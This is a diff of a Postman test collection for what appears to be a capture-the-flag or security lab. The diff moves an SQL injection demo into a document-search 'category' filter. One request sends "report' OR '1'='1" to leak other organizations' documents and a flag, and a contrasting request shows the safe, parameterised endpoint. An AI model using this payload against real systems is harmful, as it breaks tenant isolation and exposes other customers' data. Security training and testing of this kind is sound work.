@@ -18,10 +18,6 @@
       "value": ""
     },
     {
-      "key": "userOrganizationUuid",
-      "value": ""
-    },
-    {
       "key": "annaPassword",
       "value": "sunshine"
     }
@@ -119,8 +115,7 @@
               "pm.response.to.have.status(201);",
               "const account = pm.response.json();",
               "pm.expect(account.username).to.equal(pm.collectionVariables.get('username'));",
-              "pm.expect(account.organizationUuid).to.match(/^[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$/);",
-              "pm.collectionVariables.set('userOrganizationUuid', account.organizationUuid);"
+              "pm.expect(account).not.to.have.property('organizationUuid');"
             ]
           }
         }
@@ -131,7 +126,7 @@
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
-        "description": "The newly registered organization has no documents yet.",
+        "description": "The server determines our organization from the authenticated account. A new organization has no documents.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -155,7 +150,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}\"\n}",
+          "raw": "{}",
           "options": {
             "raw": {
               "language": "json"
@@ -255,11 +250,11 @@
       ]
     },
     {
-      "name": "7 · Anna searches our organization → empty",
+      "name": "7 · Anna searches her report documents",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
-        "description": "Use only the UUID returned by our signup. Anna belongs to another organization, so this legitimate search has no matches.",
+        "description": "Anna sees only report documents from her own organization. No organization UUID is sent.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -283,7 +278,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}\"\n}",
+          "raw": "{\n  \"category\": \"report\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -298,7 +293,11 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
+              "const docs = pm.response.json();",
+              "pm.expect(docs).to.be.an('array').that.is.not.empty;",
+              "const organizations = new Set(docs.map(d => JSON.parse(d.metadata).organizationUuid));",
+              "pm.expect(organizations.size).to.equal(1);",
+              "pm.expect(docs.every(d => JSON.parse(d.metadata).category === 'report')).to.be.true;"
             ]
           }
         }
@@ -309,7 +308,7 @@
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
-        "description": "The injected value starts with our own signup UUID. No other organization UUID is needed in advance.",
+        "description": "The category metadata filter contains an SQL payload. Anna’s organization is still loaded from her account, but the generated filter bypasses that condition.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -333,7 +332,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}' OR '1'='1\"\n}",
+          "raw": "{\n  \"category\": \"report' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -351,7 +350,6 @@
               "const docs = pm.response.json();",
               "const organizations = new Set(docs.map(d => JSON.parse(d.metadata).organizationUuid));",
               "pm.expect(organizations.size).to.be.at.least(5);",
-              "pm.expect(organizations.has(pm.collectionVariables.get('userOrganizationUuid'))).to.be.false;",
               "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
             ]
           }
@@ -363,7 +361,7 @@
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search-safe",
-        "description": "",
+        "description": "The same category is bound as data, so it cannot alter the SQL query.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -387,7 +385,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}' OR '1'='1\"\n}",
+          "raw": "{\n  \"category\": \"report' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
